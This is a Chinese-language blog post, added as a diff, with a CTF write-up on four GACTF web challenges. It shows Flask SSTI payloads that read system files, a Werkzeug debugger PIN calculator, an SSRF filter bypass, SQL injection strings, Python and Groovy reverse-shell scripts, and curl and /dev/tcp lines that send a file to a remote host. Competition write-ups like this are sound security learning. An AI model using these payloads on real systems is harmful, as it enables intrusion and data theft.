@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+<!--动态线条背景-->
+<script>window.onload = function () {
+            hljs.initHighlighting();
+        }</script>
+
+
+  <body>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com" />
+  
+  
+  
+  <title>GACTF Web Writeup | iluem&#39;Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Web,GACTF," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">iluem.xyz</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>链接</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/qhaoduoyu" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>GACTF Web Writeup</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-08-29
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/Web/">
+            Web
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="passagesGACTF  Web Writeup"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="GACTF-Web-Writeup"><a href="#GACTF-Web-Writeup" class="headerlink" title="GACTF  Web Writeup"></a>GACTF  Web Writeup</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a><strong>simpleflask</strong></h3><p>很明显的<strong>ssti</strong>，大概过滤了</p>
+<pre><code>pop、%20、%09、%0a、%0d、request、&#39;、+、import、\、|、eval、system、exec···</code></pre><p>等等，但是可以用<code>&quot;</code>，报错可以看到部分源码</p>
+<pre><code class="python"> if name == &quot;&quot;:
+        return render_template_string(&quot;&lt;h1&gt;hello world!&lt;h1&gt;&quot;)
+
+    check(name)
+    template = &#39;&lt;h1&gt;hello {}!&lt;h1&gt;&#39;.format(name)
+    res = render_template_string(template)
+    if &quot;flag&quot; in res:
+        abort(500, &quot;hacker&quot;)
+    return res</code></pre>
+<p>试了一下可以读文件</p>
+<pre><code>name={{[].__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__["open"]("/etc/passwd").read()}}</code></pre><p>但是过滤了<code>flag</code>，最后找到一个内置函数绕过</p>
+<pre><code>name={{[].__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__["open"]("fla".join("/g")).read()}}</code></pre><p>学习一下荣佬的做法，我直接贴代码了</p>
+<hr>
+<p><code>http://149.28.80.82:89/</code></p>
+<pre><code class="bash">PS C:\WINDOWS\System32&gt; curl.exe -X POST  http://124.70.153.63:80 -d &#39;name={{1-1}}&#39;
+&lt;h1&gt;hello 0!&lt;h1&gt;</code></pre>
+<ul>
+<li>id </li>
+</ul>
+<pre><code class="python">name={{().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["open"]("/etc/machine-id").read()}}
+
+hello a8eb6cac33e701ae867269db5ce80e7f !</code></pre>
+<pre><code class="python">name={{().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["open"]("/proc/self/cgroup").read()}}</code></pre>
+<pre><code>hello 11:devices:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 10:blkio:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 9:cpuset:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 8:freezer:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 7:pids:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 6:hugetlb:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 5:net_prio,net_cls:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 4:perf_event:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 3:memory:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 2:cpuacct,cpu:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 1:name=systemd:/docker/62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f !</code></pre><p><code>/usr/local/lib/python3.6/dist-packages/werkzeug/debug/__init__.py</code>  <code>48-76</code>行</p>
+<pre><code class="python">def get_machine_id():
+    global _machine_id
+
+    if _machine_id is not None:
+        return _machine_id
+
+    def _generate():
+        linux = b&quot;&quot;
+
+        # machine-id is stable across boots, boot_id is not.
+        for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:
+            try:
+                with open(filename, &quot;rb&quot;) as f:
+                    value = f.readline().strip()
+            except IOError:
+                continue
+
+            if value:
+                linux += value
+                break
+
+        # Containers share the same machine id, add some cgroup
+        # information. This is used outside containers too but should be
+        # relatively stable across boots.
+        try:
+            with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:
+                linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]
+        except IOError:
+            pass</code></pre>
+<p>注意此题和[GYCTF2020]FlaskApp的主要区别在于<code>/etc/machine-id</code>存在,其他一样</p>
+<pre><code class="python">linux =  get(/etc/machine-id) + get(/proc/self/cgroup) </code></pre>
+<ul>
+<li>MAC</li>
+</ul>
+<p>注意MAC值是会变化的</p>
+<pre><code class="python">name={{().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["open"]("/sys/class/net/eth0/address").read()}}</code></pre>
+<pre><code class="python">hello 02:42:ac:14:00:07 !
+&gt;&gt;&gt; print(int(&#39;0242ac140007&#39;,16))
+2485378088967</code></pre>
+<ul>
+<li>username</li>
+</ul>
+<pre><code>name={{().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["open"]("/etc/passwd").read()}}</code></pre><pre><code>hello root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin messagebus:x:101:101::/nonexistent:/usr/sbin/nologin !</code></pre><pre><code class="python">name={{().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__["geteuid"]()}}
+
+hello 0!</code></pre>
+<table>
+<thead>
+<tr>
+<th>变量名</th>
+<th>变量值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>当前计算机用户名</td>
+<td>root</td>
+</tr>
+<tr>
+<td>modname</td>
+<td>flask.app</td>
+</tr>
+<tr>
+<td>getattr(app, “__name__”, app.__class__.__name__)</td>
+<td>Flask</td>
+</tr>
+<tr>
+<td>str(uuid.getnode())</td>
+<td>a8eb6cac33e701ae867269db5ce80e7f62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f</td>
+</tr>
+<tr>
+<td>get_machine_id()</td>
+<td>2485378088970</td>
+</tr>
+<tr>
+<td>绝对路径</td>
+<td>/usr/local/lib/python3.7/dist-packages/flask/app.py</td>
+</tr>
+</tbody></table>
+<ul>
+<li>PIN -  payload:</li>
+</ul>
+<pre><code class="python">import hashlib
+from itertools import chain
+probably_public_bits = [
+    &#39;root&#39;,
+    &#39;flask.app&#39;,
+    &#39;Flask&#39;,
+    &#39;/usr/local/lib/python3.7/dist-packages/flask/app.py&#39;,
+]
+
+private_bits = [
+    &#39;2485378088968&#39;,
+    &#39;a8eb6cac33e701ae867269db5ce80e7f62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f&#39;
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&#39;utf-8&#39;)
+    h.update(bit)
+h.update(b&#39;cookiesalt&#39;)
+
+cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b&#39;pinsalt&#39;)
+    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)</code></pre>
+<ul>
+<li>shell</li>
+</ul>
+<pre><code class="python">&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.popen(&#39;ls /&#39;).read()
+&#39;bin\nboot\ndev\netc\nflag\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n&#39;  
+&gt;&gt;&gt; os.popen(&#39;cat /flag&#39;).read()
+&#39;GACTF{fac9165b6a2b5ac8bd3b99fad0619366}\n&#39;</code></pre>
+<hr>
+<h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a><strong>EZFLASK</strong></h3><p>给了app.py一部分源码</p>
+<pre><code class="python">
+# -*- coding: utf-8 -*-
+from flask import Flask, request
+import requests
+from waf import *
+import time
+app = Flask(__name__)
+
+@app.route(&#39;/ctfhint&#39;)
+def ctf():
+    hint =xxxx # hints
+    trick = xxxx # trick
+    return trick
+
+@app.route(&#39;/&#39;)
+def index():
+    # app.txt
+@app.route(&#39;/eval&#39;, methods=[&quot;POST&quot;])
+def my_eval():
+    # post eval
+@app.route(xxxxxx, methods=[&quot;POST&quot;]) # Secret
+def admin():
+    # admin requests
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;,port=8080)</code></pre>
+<p>在<code>eval</code>路由下测试可以运算，大概可能是eval(‘’)，但是过滤了很多，POST传递</p>
+<pre><code>eval=admin.__globals__</code></pre><p>得到</p>
+<pre><code>{&#39;my_eval&#39;: , &#39;app&#39;: , &#39;waf_eval&#39;: , &#39;admin&#39;: , &#39;index&#39;: , &#39;waf_ip&#39;: , &#39;__builtins__&#39;: , &#39;admin_route&#39;: &#39;/h4rdt0f1nd_9792uagcaca00qjaf&#39;, &#39;__file__&#39;: &#39;app_1.py&#39;, &#39;request&#39;: , &#39;__package__&#39;: None, &#39;Flask&#39;: , &#39;ctf&#39;: , &#39;waf_path&#39;: , &#39;time&#39;: , &#39;__name__&#39;: &#39;__main__&#39;, &#39;requests&#39;: , &#39;__doc__&#39;: None}</code></pre><p>得到了admin的路由<code>h4rdt0f1nd_9792uagcaca00qjaf</code>，访问后发现让传递</p>
+<pre><code>post ip=x.x.x.x&amp;port=xxxx&amp;path=xxx =&gt; http://ip:port/path</code></pre><p>猜测可能是拼接上去的，试着访问一下服务器，结果发现是python发的请求</p>
+<p><img src="https://i.loli.net/2020/08/30/PUZjJ28GkTzEeiL.png" alt="image-20200830124828190"></p>
+<p>试一下<code>ip=127.0.0.1&amp;port=8080&amp;path=</code>出现<code>hacker?</code>，测试过后发现过滤了<code>127.0.0.1</code>，使用<code>127.1.1.1</code>、<code>127.0.1.1</code>、<code>127.1.0.1</code>都可以绕过</p>
+<p><img src="https://i.loli.net/2020/08/30/skrNlSdxfXYJMWp.png" alt="image-20200830123934495"></p>
+<p>爆破端口最后发现5000端口开放。</p>
+<p><img src="https://i.loli.net/2020/08/30/gmnzuNvEhAla9HF.png" alt="image-20200830125047228"></p>
+<p>看到<code>return flask.render_template_string(hack)</code>，又回到<code>ssti</code>，<code>flag</code>在<code>config:FLAG</code>里，但是过滤了<code>config</code>，这里学习一下<a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener"><strong>Mi1k7ea</strong></a>师傅的绕过</p>
+<p><img src="https://i.loli.net/2020/08/30/qrux1oQwmiW7hZl.png" alt="image-20200830125327435"></p>
+<p>因此通过</p>
+<pre><code>{{url_for.__globals__['current_app'].__dict__}}</code></pre><p>即可得到flag</p>
+<p><img src="https://i.loli.net/2020/08/30/Nv6W2YjdsfEeXJo.png" alt="image-20200830125555051"></p>
+<p><a href="https://www.mi1k7ea.com/2019/06/02/浅析Python-Flask-SSTI/#无法直接获取全局变量config" target="_blank" rel="noopener">参考链接</a></p>
+<h3 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a><strong>XWiki</strong></h3><p>找到一个CVE</p>
+<p><a href="https://jira.xwiki.org/browse/XWIKI-16960" target="_blank" rel="noopener">https://jira.xwiki.org/browse/XWIKI-16960</a></p>
+<p><img src="https://i.loli.net/2020/08/30/wU3NvCyIDQZkXts.png" alt="image-20200830125911082"></p>
+<p>描述得超级详细</p>
+<p>直接去试试</p>
+<pre><code class="python">import os
+print(os.popen(&quot;id&quot;).read())
+print(os.popen(&quot;hostname&quot;).read())
+print(os.popen(&quot;ifconfig&quot;).read())</code></pre>
+<p><img src="https://i.loli.net/2020/08/30/7c6GVbadTtvkDXM.png" alt="image-20200830130545367"></p>
+<p>只返回了两个，应该是另一个被过滤了。</p>
+<p>测试另外一个</p>
+<pre><code class="groovy">r = Runtime.getRuntime()
+proc = r.exec(&#39;id&#39;);
+BufferedReader stdInput1 = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+String s1 = null;
+while ((s1 = stdInput1.readLine()) != null) { print s1; }</code></pre>
+<p><img src="https://i.loli.net/2020/08/30/9teXjuoBsGVdRTm.png" alt="image-20200830130644857"></p>
+<p>荣佬找了一个python的反弹shell脚本，但是好像没有执行，应该是过滤了。</p>
+<pre><code class="python">import os
+os.popen(&#39;&#39;&#39; python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;yourip&#39;,yourport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;&#39;&#39;&#39;)</code></pre>
+<p>那我想着就去找一下另一个有没有反弹shell的脚本，结果真就找到了，</p>
+<pre><code class="groovy">String host=&quot;localhost&quot;;
+int port=8044;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>
+<p><img src="https://i.loli.net/2020/08/30/atY3eWsxJnFNLRq.png" alt="image-20200830131107740"></p>
+<p>稍作修改就能用了</p>
+<p><img src="https://i.loli.net/2020/08/30/atY3eWsxJnFNLRq.png" alt="image-20200830131159191"></p>
+<p>到这了我以为没有弹成功，结果我傻逼了</p>
+<p>最后在根目录可以找到<code>readflag</code>但是是一个<code>elf</code>可执行文件。大概是一个游戏，我还傻傻地玩了好久，早知道早丢给逆向队友就好了。</p>
+<p>一边传，另一边nc接收就好</p>
+<p><code>curl ip -F &quot;file=@/readflag&quot; -H &quot;token: 222&quot; -v</code></p>
+<p><code>nc -lvp port &gt;readflag</code></p>
+<p>不过我居然没事干在服务器端还去搞了个文件上传脚本，当然也是可行的。</p>
+<p>这样也可</p>
+<p><code>cat /readflag &gt; /dev/tcp/ip/7777</code></p>
+<p>最后逆向队友解出一串二进制字符串</p>
+<pre><code>01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101</code></pre><pre><code class="python">def tobytes(n): #long to bytes
+    return n.to_bytes((n.bit_length() + 7) // 8, &#39;big&#39;)
+print(tobytes(int(&#39;01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101&#39;,2)))</code></pre>
+<p>转换一下即可得到flag</p>
+<h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a><strong>carefuleyes</strong></h3><p><code>class</code>部分是<code>2016 hitcon-babytrick</code>改的</p>
+<p>还是和原题一样，先得找到<code>privilege=admin</code>的用户名和密码</p>
+<p>在<code>XCTFGG</code>类的<code>login</code>函数中只要以<code>admin</code>权限账户登录就能拿到<code>flag</code></p>
+<p><img src="https://i.loli.net/2020/08/30/OkNefC73YdU2zoD.png" alt="image-20200830194805373"></p>
+<p>发现在<code>rename.php</code>的更新文件名部分存在注入</p>
+<p><img src="https://i.loli.net/2020/08/30/GRlW3g7QuKXc1qz.png" alt="image-20200830195012309"></p>
+<p>本地环境利用</p>
+<pre><code>&#39;||(updatexml(1,concat(0x7e,(select concat(username,0x7e,password)from user where privilege=0x61646d696e)),1))%23
+
+&#39;||(select 1 from (select count(*),concat((select concat(username,0x7e,password)from user where privilege=0x61646d696e),floor(rand(0)*2))x from information_schema.tables group by x limit 1,1)a)%23</code></pre><p><img src="https://i.loli.net/2020/08/30/HtsciEuyVS4hgUW.png" alt="image-20200830195159056"></p>
+<p>拿到用户名和密码</p>
+<p>然后在upload.php页面序列化对象</p>
+<p><img src="https://i.loli.net/2020/08/30/rFOfA172CE56v39.png" alt="image-20200830195254668"></p>
+<pre><code class="php">&lt;?php
+
+class XCTFGG{
+    private $method;
+    private $args;
+
+    public function __construct($method, $args) {
+        $this-&gt;method = $method;
+        $this-&gt;args = $args;
+    }
+   function login() {}
+}
+$result = serialize(new XCTFGG(&#39;login&#39;,[&#39;admin&#39;,&#39;123456789&#39;]));
+var_dump($result);
+
+#O:6:&quot;XCTFGG&quot;:2:{s:14:&quot;%00XCTFGG%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00XCTFGG%00args&quot;;a:2:{i:0;s:5:&quot;admin&quot;;i:1;s:9:&quot;123456789&quot;;}}</code></pre>
+<p>上传测试</p>
+<p><img src="https://i.loli.net/2020/08/30/OagwC3Xx8BUDG7F.png" alt="image-20200830195429481"></p>
+<p>结果很开心的去线上测试，失望而归</p>
+<p>重新审计代码，最后发现有二次注入，/(ㄒoㄒ)/~~</p>
+<p><img src="https://i.loli.net/2020/08/30/a1G2F8exndz4cyU.png" alt="image-20200830235611574"></p>
+<p>上传对文件名进行了<code>addslashes</code>过滤，但是在rename.php又进行了查询操作。</p>
+<p><img src="https://i.loli.net/2020/08/30/ec84yvUndYMzONo.png" alt="image-20200830235809117"></p>
+<p>最关键的是还有</p>
+<pre><code class="php"> $info = $info-&gt;fetch_assoc();
+        echo &quot;oldfilename : &quot;.$info[&#39;filename&#39;].&quot; will be changed.&quot;;</code></pre>
+<p>将数据库中的语句插入到查询中并且将结果输出。</p>
+<p>至于为什么会产生二次注入</p>
+<p><img src="https://i.loli.net/2020/08/31/VRJOa1SM4iTsCky.png" alt="image-20200831000110211"></p>
+<p>那么这标标准准的二次注入就在这儿了。</p>
+<p>构造文件名</p>
+<pre><code>filename=&quot;&#39; union (select 1,concat(username,&#39;~&#39;,password),3,4,5 from user where privilege=0x61646d696e)-- 1.txt&quot;</code></pre><p>上传，<code>filename</code>的列数和位置可以在sql文件中找，也可以本地环境中测试。</p>
+<p>上传成功后再rename.php页面输入原用户名即可</p>
+<pre><code>&#39; union (select 1,concat(username,&#39;~&#39;,password),3,4,5 from user where privilege=0x61646d696e)-- 1&amp;newname=23</code></pre><p>得到<code>XM~qweqweqwe</code></p>
+<p><img src="https://i.loli.net/2020/08/31/HsFh17Ac2JrYGIR.png" alt="image-20200831084212395"></p>
+<p>修改原来的payload再次上传+序列化即可拿到flag</p>
+<pre><code>O:6:&quot;XCTFGG&quot;:2:{s:14:&quot;%00XCTFGG%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00XCTFGG%00args&quot;;a:2:{i:0;s:2:&quot;XM&quot;;i:1;s:9:&quot;qweqweqwe&quot;;}}</code></pre><p><img src="https://i.loli.net/2020/08/30/xht4qzrkK9GjUyH.png" alt="image-20200830233258763"></p>
+
+    </div>
+  </div>
+  
+  
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/GACTF/">
+              #GACTF
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/passages2020%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%20Web%20Writeup/" target="_self">2020钓鱼城杯 Web Writeup</a>
+      </div>
+    
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz",
+      appKey: "sivgWCRfGcA6BX905S8dIz1E",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz", "sivgWCRfGcA6BX905S8dIz1E");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
